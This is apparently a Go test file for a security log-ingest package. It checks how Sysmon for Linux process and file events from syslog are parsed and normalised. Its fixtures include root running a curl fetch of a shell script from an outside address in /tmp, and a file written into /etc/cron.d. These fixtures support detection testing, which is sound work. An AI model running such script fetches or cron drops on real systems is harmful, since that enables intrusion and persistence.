package ingest

import (
	"testing"
	"time"
)

// A process creation as Sysmon for Linux writes it to syslog.
const linuxSysmonProcess = `<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2026-10-12T15:25:42.471367000Z"/><EventRecordID>9</EventRecordID><Correlation/><Execution ProcessID="25330" ThreadID="25330"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web01</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2026-10-12 15:25:42.474</Data><Data Name="ProcessGuid">{8f0c7a2e-4f61-6165-2d43-a1a6fa550000}</Data><Data Name="ProcessId">25333</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -s http://198.51.100.7/x.sh</Data><Data Name="CurrentDirectory">/tmp</Data><Data Name="User">root</Data><Data Name="LogonGuid">{8f0c7a2e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">3</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{8f0c7a2e-4f60-6165-0d63-21f1b9550000}</Data><Data Name="ParentProcessId">25300</Data><Data Name="ParentImage">/usr/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>`

func TestLinuxSysmon(t *testing.T) {
	now := time.Date(2026, 10, 12, 16, 0, 0, 0, time.UTC)
	ev := parseSyslogLine("Oct 12 15:25:42 web01 sysmon[25330]: "+linuxSysmonProcess, "linux:auth", now)
	if ev.Model != "Endpoint" {
		t.Fatalf("model %s: %v", ev.Model, ev.Fields)
	}
	for k, want := range map[string]any{
		"sourcetype": SysmonLinuxSourcetype, "signature_id": "1", "host": "web01", "process_path": "/usr/bin/curl",
		"process_name": "curl", "process": "curl -s http://198.51.100.7/x.sh", "parent_process_name": "bash",
		"user": "root", "process_id": int64(25333), "vendor_product": "Sysmon for Linux",
	} {
		if got := ev.Fields[k]; got != want {
			t.Errorf("%s = %#v, want %#v", k, got, want)
		}
	}
	if _, ok := ev.Fields["app"]; ok {
		t.Error("app is Sysmon's own")
	}
	// Anything else from the sysmon program is kept as it is.
	if ev := parseSyslogLine("Oct 12 15:25:42 web01 sysmon[25330]: Sysmon started", "linux:auth", now); ev.Model != "Other" {
		t.Errorf("plain line: model %s", ev.Model)
	}
	if ev := parseSyslogLine("Oct 12 15:25:42 web01 sysmon[25330]: <Event><System>", "linux:auth", now); ev.Model != "Other" {
		t.Errorf("broken XML: model %s", ev.Model)
	}
}

func TestLinuxSysmonRecord(t *testing.T) {
	now := time.Date(2026, 10, 12, 16, 0, 0, 0, time.UTC)
	rec := LinuxSysmonRecord("11", "db01", now, map[string]string{"Image": "/usr/bin/cp", "TargetFilename": "/etc/cron.d/<x>&y", "User": "root"})
	ev := Normalize("linux.journal", rec, now)
	if ev.Model != "Filesystem" || ev.Fields["file_path"] != "/etc/cron.d/<x>&y" || ev.Fields["host"] != "db01" || ev.Fields["sourcetype"] != SysmonLinuxSourcetype || !ev.Time.Equal(now) {
		t.Errorf("event %s %v at %v", ev.Model, ev.Fields, ev.Time)
	}
}
